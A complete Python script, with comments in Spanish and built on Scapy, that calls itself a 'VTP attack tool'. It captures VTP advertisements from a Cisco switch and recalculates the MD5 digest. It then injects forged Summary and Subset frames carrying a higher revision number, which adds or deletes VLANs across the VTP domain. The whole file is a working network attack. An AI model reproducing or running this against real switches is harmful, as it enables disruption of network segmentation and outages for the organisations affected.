#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VTP ATTACK TOOL - Captura VLANs reales del switch y recalcula MD5 correctamente.
"""

import sys, os, time, struct, hashlib, socket, argparse

if os.geteuid() != 0:
    print("\n[!] Requiere root: sudo python3 VTP_Attack.py\n")
    sys.exit(1)

try:
    from scapy.all import get_if_hwaddr, sendp, sniff, Ether, Dot1Q, LLC, SNAP, Raw, conf
    conf.verb = 0
except ImportError:
    print("\n[!] Instala scapy: pip install scapy\n")
    sys.exit(1)

def parse_args():
    p = argparse.ArgumentParser(description="VTP Attack Tool")
    p.add_argument("-i",  "--interface", required=True)
    p.add_argument("-d",  "--domain",    default=None,             help="Dominio VTP (omitir = auto-detectar)")
    p.add_argument("-p",  "--password",  default="",               help="Contraseña VTP (si aplica)")
    p.add_argument("-a",  "--action",    choices=["add","delete"],  help="Accion: add o delete")
    p.add_argument("-v",  "--vlan",      type=int, default=None,   help="VLAN ID (2-1001)")
    p.add_argument("-n",  "--name",      default="PWNED_VLAN",     help="Nombre VLAN (solo add)")
    p.add_argument("-t",  "--timeout",   type=int, default=120,    help="Timeout sniff (default: 120)")
    p.add_argument("--tag",  type=int,  default=1,                 help="802.1Q tag (default: 1)")
    p.add_argument("--vtp-version", type=int, choices=[1,2], default=None, help="Version VTP (omitir = auto)")
    p.add_argument("--sniff-only", action="store_true",            help="Solo capturar info, no atacar")
    return p.parse_args()

def calc_md5(version, domain, revision, updater_ip, vlans_raw, password=""):
    d = domain.encode("ascii")
    summary = bytearray(72)
    summary[0] = version
    summary[1] = 0x01
    summary[2] = 0x00
    summary[3] = len(d)
    summary[4:4+len(d)] = d
    summary[36:40] = struct.pack(">I", revision)
    summary[40:44] = socket.inet_aton(updater_ip)
    data = b"\x00"*16 + bytes(summary) + vlans_raw + b"\x00"*16
    if password:
        pw = password.encode("ascii")[:64].ljust(64, b"\x00")
        data += pw
    return hashlib.md5(data).digest()

def build_vlan(vlan_id, name):
    nb = name.encode('ascii', errors='ignore')
    nb = nb + b'\x00' * ((4 - len(nb) % 4) % 4)
    info_len = 12 + len(nb)
    return struct.pack('!BBBBHHI', info_len, 0x00, 0x01, len(name), vlan_id, 1500, vlan_id) + nb

def parse_vlans(data):
    vlans = {}
    i = 0
    while i < len(data):
        if i + 12 > len(data):
            break
        info_len = data[i]
        if info_len < 12 or i + info_len > len(data):
            break
        record = data[i:i+info_len]
        try:
            vlan_id  = struct.unpack('!H', record[4:6])[0]
            name_len = record[3]
            name     = record[12:12+name_len].decode('ascii', errors='ignore').rstrip('\x00')
            vlans[vlan_id] = (name, bytes(record))
            print(f"      VLAN {vlan_id:4d}  {name}")
        except Exception:
            pass
        i += info_len
    return vlans

def get_vtp_payload(pkt):
    if pkt.haslayer(SNAP) and pkt.haslayer(Raw):
        if pkt[SNAP].code == 0x2003:
            return bytes(pkt[Raw].load)
    return None

def make_frame(iface, payload, tag):
    src = get_if_hwaddr(iface)
    return (
        Ether(dst="01:00:0c:cc:cc:cc", src=src) /
        Dot1Q(vlan=tag) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2003) /
        Raw(load=payload)
    )

def sniff_vtp(iface, timeout):
    result = {"summary": None, "subset": None}

    def handler(pkt):
        vtp = get_vtp_payload(pkt)
        if vtp is None or len(vtp) < 4:
            return
        code = vtp[1]
        if code == 0x01 and result["summary"] is None:
            result["summary"] = vtp
            print(f"    [+] Summary capturado ({len(vtp)} bytes)")
        elif code == 0x02 and result["subset"] is None:
            result["subset"] = vtp
            print(f"    [+] Subset  capturado ({len(vtp)} bytes)")
        if result["summary"] and result["subset"]:
            return True

    sniff(iface=iface, filter="ether dst 01:00:0c:cc:cc:cc",
          stop_filter=handler, timeout=timeout, store=False)
    return result

def main():
    args = parse_args()

    print(f"\n[*] Interfaz : {args.interface}  |  Tag 802.1Q: {args.tag}")
    if args.sniff_only:
        print("[*] Modo: SNIFF ONLY\n")
    else:
        print(f"[*] Accion   : {args.action.upper() if args.action else 'N/A'}  VLAN {args.vlan}  Dominio: {args.domain or 'AUTO'}")
    print(f"[*] Timeout  : {args.timeout}s\n")

    print(f"[*] Esperando Summary + Subset del switch (max {args.timeout}s)...")
    print(f"    TIP: Crea/borra una VLAN en el switch para forzar anuncio inmediato\n")
    pkts = sniff_vtp(args.interface, args.timeout)

    if not pkts["summary"] and not pkts["subset"]:
        print("[!] No se capturo ningún paquete VTP. Verifica la interfaz.")
        sys.exit(1)

    domain_name    = args.domain
    current_rev    = 0
    vtp_ver        = args.vtp_version
    updater_ip     = "0.0.0.0"   # se extrae del Summary real
    timestamp      = ""
    existing_vlans = {}

    # ── Parsear Summary ─────────────────────────────────────────────────────
    if pkts["summary"]:
        sv = pkts["summary"]
        try:
            detected_ver = sv[0]
            dlen         = sv[3]
            detected_dom = sv[4:4+dlen].decode('utf-8', errors='ignore').strip('\x00')
            current_rev  = struct.unpack('!I', sv[36:40])[0]

            # Extraer updater IP real del Summary (bytes 40-43)
            updater_ip   = socket.inet_ntoa(sv[40:44])

            # Extraer timestamp real del Summary (bytes 44-55, 12 bytes ASCII)
            timestamp    = sv[44:56].decode('ascii', errors='ignore').rstrip('\x00')

            if vtp_ver is None:
                vtp_ver = detected_ver
                print(f"[+] Version VTP detectada : {vtp_ver}")
            if domain_name is None:
                domain_name = detected_dom
                print(f"[+] Dominio detectado     : {domain_name}")

            print(f"[+] Revision actual       : {current_rev}")
            print(f"[+] Updater IP            : {updater_ip}")
            print(f"[+] Timestamp             : {timestamp}")

        except Exception as e:
            print(f"[!] Error parseando Summary: {e}")

    if vtp_ver is None:
        vtp_ver = 1
    if domain_name is None:
        print("[!] Dominio no detectado. Usa -d <dominio>")
        sys.exit(1)

    # Generar nuevo timestamp si no se capturo
    if not timestamp:
        timestamp = time.strftime("%y%m%d%H%M%S")

    # ── Parsear Subset ──────────────────────────────────────────────────────
    if pkts["subset"]:
        sub       = pkts["subset"]
        vlan_data = sub[40:]
        print(f"\n[+] VLANs en el switch:")
        existing_vlans = parse_vlans(vlan_data)
        print(f"    Total: {len(existing_vlans)} VLANs")
    else:
        print("[!] No se capturo Subset")
        existing_vlans[1] = ("default", build_vlan(1, "default"))

    # ── Modo sniff-only ─────────────────────────────────────────────────────
    if args.sniff_only:
        print(f"\n{'='*50}")
        print(f"  Dominio    : {domain_name}")
        print(f"  Version    : {vtp_ver}")
        print(f"  Revision   : {current_rev}")
        print(f"  Updater IP : {updater_ip}")
        print(f"  Timestamp  : {timestamp}")
        print(f"  VLANs      : {sorted(existing_vlans.keys())}")
        print(f"{'='*50}\n")
        return

    if not args.action:
        print("[!] Especifica --action add o delete")
        sys.exit(1)
    if args.vlan is None:
        print("[!] Especifica --vlan <ID>")
        sys.exit(1)

    # ── Modificar DB ────────────────────────────────────────────────────────
    if args.action == "add":
        existing_vlans[args.vlan] = (args.name, build_vlan(args.vlan, args.name))
        print(f"\n[*] VLAN {args.vlan} ({args.name}) agregada")
    elif args.action == "delete":
        if args.vlan in existing_vlans:
            del existing_vlans[args.vlan]
            print(f"\n[*] VLAN {args.vlan} eliminada de la DB")
        else:
            print(f"\n[!] VLAN {args.vlan} no encontrada en la DB")

    vlans_raw = b"".join(vraw for _, (_, vraw) in sorted(existing_vlans.items()))

    # Usar timestamp nuevo para que el switch lo acepte como mas reciente
    new_timestamp = time.strftime("%y%m%d%H%M%S")
    new_rev       = current_rev + 50

    md5 = calc_md5(vtp_ver, domain_name, new_rev, updater_ip, vlans_raw, args.password)
    print(f"[+] Version VTP  : {vtp_ver}")
    print(f"[+] Updater IP   : {updater_ip}")
    print(f"[+] Nueva rev    : {new_rev}")
    print(f"[+] MD5          : {md5.hex()}")
    if args.password:
        print(f"[+] Password     : {args.password}")

    # ── Construir payloads ──────────────────────────────────────────────────
    db = domain_name.encode()[:32]
    dp = db.ljust(32, b'\x00')

    summary_payload = (
        bytes([vtp_ver, 0x01, 0x01, len(db)]) + dp +
        struct.pack('!I', new_rev) +
        socket.inet_aton(updater_ip) +
        new_timestamp.encode()[:12].ljust(12, b'\x00') +
        md5
    )
    subset_payload = (
        bytes([vtp_ver, 0x02, 0x01, len(db)]) + dp +
        struct.pack('!I', new_rev) +
        vlans_raw
    )

    sf = make_frame(args.interface, summary_payload, args.tag)
    xf = make_frame(args.interface, subset_payload,  args.tag)

    print("\n[*] Inyectando Summary...")
    sendp(sf, iface=args.interface, verbose=False)
    time.sleep(0.05)
    print("[*] Inyectando Subset...")
    sendp(xf, iface=args.interface, verbose=False)

    print("\n[+] Listo. Verifica en el switch:")
    print("      show vtp status")
    print("      show vlan brief\n")

if __name__ == "__main__":
    main()
